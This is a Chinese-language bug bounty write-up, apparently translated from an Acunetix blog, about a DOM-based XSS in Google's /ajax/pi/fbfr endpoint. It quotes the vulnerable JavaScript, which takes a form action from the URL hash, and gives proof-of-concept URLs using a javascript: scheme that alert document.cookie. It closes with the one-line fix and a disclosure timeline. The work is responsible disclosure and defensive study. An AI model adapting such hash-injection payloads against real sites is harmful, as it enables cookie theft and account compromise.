![](https://image.3001.net/images/20200224/1582536807_5e539867e1ea3.png!small)

**你可能是一个比较懒惰的黑客，直接不想去挖掘Google的漏洞，而我和朋友linkks只是稍微勤快和幸运一点，再配合上漏扫利器Acunetix
Vulnerability Scanner，就发现了Google的一个XSS漏洞，收获了$5000。**

##  第一步 Acunetix Vulnerability Scanner跳出的一条安全警告

我们平时的一项业余研究就是，使用Acunetix在内的各种安全扫描工具去扫描测试不同的Google服务，在我们的测试目录里有好多目标需要一一进行扫描。2019年12月当我们用Acunetix扫描Google的某项服务时，突然跳出一项XSS漏洞安全警告，其扫描测试Payload为：

>
> <https://google.ws/ajax/pi/fbfr?wvstest=javascript:domxssExecutionSink>(1,%22%27%5C%22%3E%3Cxsstag%3E()locxss%22)

通常来说，这类型的漏洞警告大多都是误报，我们一般都不会跟进处理，但这个目标是Google啊，所以值得深究一番。

##  第二步 分析HTTP请求的响应

首先，我们来看看上个漏洞警告涉及的HTTP响应内容，如下：

    
    
    HTTP/1.1 200 OK
    
        ...
    
        <!doctype html><div style="display:none"> <form method="post"> </form> <script nonce="+ao+4Egc+7YExl3qyyWMJg==">(function(){var a=window.document.forms[0],b=location.hash.substr(1);b||window.close();var c=b.split("&"),d=decodeURIComponent(c[0]);a.action=d;for(var e=1;e<c.length;e++){var f=c[e].split("="),g=document.createElement("input");g.type="hidden";g.name=f[0];g.value=decodeURIComponent(f[1]);a.appendChild(g)}a.submit();}).call(this);</script> </div>

分析来看，该响应包括一个空的form格式，以及一些JS片段代码。为了实现更好的可读性，重新把其中的JS代码整理如下：

    
    
    (function() {
    
            var a = window.document.forms[0],
    
                b = location.hash.substr(1);
    
            b || window.close();
    
            var c = b.split("&"),
    
                d = decodeURIComponent(c[0]);
    
            a.action = d;
    
            for (var e = 1; e < c.length; e++) {
    
                var f = c[e].split("="),
    
                    g = document.createElement("input");
    
                g.type = "hidden";
    
                g.name = f[0];
    
                g.value = decodeURIComponent(f[1]);
    
                a.appendChild(g)
    
            }
    
            a.submit();
    
        }).call(this);

接下来，我们就仔细分析上述JS代码，为此，我们加上一些注释来进行理解：

    
    
    (function() {
    
        // Function that is going to be auto-executed 
    
        }).call(this);
    
        (function() {
    
          // The variable “a” points to a form that is empty right now
    
            var a = window.document.forms[0],
    
            // The variable b is a location hash without the # character
    
                b = location.hash.substr(1);
    
          // If there is no b (no hash in the location URI), try to self-close
    
            b || window.close();
    
          // Split the location hash using the & character
    
            var c = b.split("&"),
    
            // And decode the first (zero) element
    
                d = decodeURIComponent(c[0]);
    
          // The hash value becomes the action of the form
    
            a.action = d;
    
        // The below content is not important in the context of the issue
    
            for (var e = 1; e < c.length; e++) {
    
                var f = c[e].split("="),
    
                    g = document.createElement("input");
    
                g.type = "hidden";
    
                g.name = f[0];
    
                g.value = decodeURIComponent(f[1]);
    
                a.appendChild(g)
    
            }
    
          // The form is auto-submitted
    
            a.submit();
    
        }).call(this);

##  第三步 构造恰当的Payload触发XSS漏洞

如果理解了上述JS代码的具体含义，之后就是构造恰当的Payload实现XSS触发了，如下Payload成功实现了Google上的XSS，返回当前用户Cookie信息：

> <https://google.ws/ajax/pi/fbfr#javascript:alert>(document.cookie)

![](https://image.3001.net/images/20200224/1582536621_5e5397ad9c3e7.png!small)另外，我们还发现，其它的Google服务端也会受到该XSS漏洞影响：

> <https://google.com/ajax/pi/fbfr#javascript:alert>(document.cookie)

![](https://image.3001.net/images/20200224/1582536637_5e5397bdd26c2.png!small)

##  漏洞修复

漏洞修复很简单，只需要在上述JS中增加一行代码 0 != d.indexOf("http") &&
window.close()，判断URL的location hash，即#后面的开始的字段以http开始，就能消除漏洞。

    
    
    (function() {
    
            var a = window.document.forms[0],
    
                b = location.hash.substr(1);
    
            b || window.close();
    
            var c = b.split("&"),
    
                d = decodeURIComponent(c[0]);
    
          // Only the below line needed to be changed 
    
          // to check if the location hash begins with http:
    
            0 != d.indexOf("http") && window.close();
    
            a.action = d;
    
            for (var e = 1; e < c.length; e++) {
    
                var f = c[e].split("="),
    
                    g = document.createElement("input");
    
                g.type = "hidden";
    
                g.name = f[0];
    
                g.value = decodeURIComponent(f[1]);
    
                a.appendChild(g)
    
            }
    
            a.submit();
    
        }).call(this);

##  漏洞上报和处理进程

> 2019.12.27 漏洞上报
>
> 2019.12.27 漏洞分类
>
> 2020.1.8 Google修复漏洞
>
> 2020.1.8 Google发放赏金$5000

***参考来源：[acunetix](https://www.acunetix.com/blog/web-security-zone/xss-google-acunetix/)，clouds 编译整理，转载请注明来自 FreeBuf.COM**

  

